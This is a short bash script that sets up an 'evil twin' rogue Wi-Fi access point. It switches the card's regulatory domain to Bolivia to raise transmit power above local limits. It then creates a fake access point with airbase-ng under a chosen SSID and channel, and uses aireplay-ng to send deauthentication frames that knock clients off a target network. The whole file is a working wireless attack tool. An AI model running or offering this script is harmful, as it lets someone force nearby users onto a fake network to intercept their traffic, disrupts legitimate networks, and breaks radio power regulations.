#! /bin/bash
#

evilSSID=$1
evilMAC=$2
evilBSSID="aa:bb:cc:dd:ee:ff"

evilChan=$3

echo $evilSSID
echo $evilMAC
echo $evilChan


sudo service dnsmasq stop
sudo service dnsmasq start

## Bring interfaces down so that
## BO country registration can be SET this
## allows for higher signal output
sudo ifconfig wlan1 down

sleep 1s

sudo iw reg set BO

sleep 1s

sudo ifconfig wlan1 up

## when interface is started it will be increased from 20 dBm to 30 dBm

sudo airmon-ng start wlan1
sleep 5s
sudo airbase-ng -a $evilBSSID --essid $evilSSID -c $evilChan mon0 &
sleep 5s

#service dnsmasq restart


sleep 1s

#aireplay-ng --deauth 0 -a $evilMAC

sudo aireplay-ng --deauth 10 -a $evilMAC mon0 --ignore-negative-one

 
